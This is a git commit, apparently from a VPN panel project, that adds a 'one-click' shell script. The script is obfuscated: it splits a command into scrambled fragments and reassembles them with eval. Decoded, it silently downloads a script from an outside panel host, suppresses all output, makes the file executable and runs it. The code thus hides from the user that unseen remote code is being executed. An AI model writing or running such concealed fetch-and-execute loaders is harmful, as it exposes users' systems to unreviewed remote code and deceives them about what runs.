da151aa017292039dffb5df899345d394893ccb3
vpnneo <84681337+vpnneo@users.noreply.github.com>
2021-05-24 13:03:21 +0700

    Add files via upload

---
+++ 1click.sh
@@ -0,0 +1,3 @@
+z="
+";Ez=' htt';Gz='/pan';Tz=' +x ';Vz='./se';Uz=' && ';Mz='sh >';Lz='one.';Wz='tup.';Cz='setu';Nz=' /de';Oz='v/nu';Kz='m/1d';Sz='hmod';Az='wget';Dz='p.sh';Pz='ll 2';Iz='pnne';Hz='el.v';Jz='o.co';Xz='sh';Rz='&& c';Qz='>&1 ';Fz='ps:/';Bz=' -O ';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Cz$Dz$Uz$Vz$Wz$Xz"
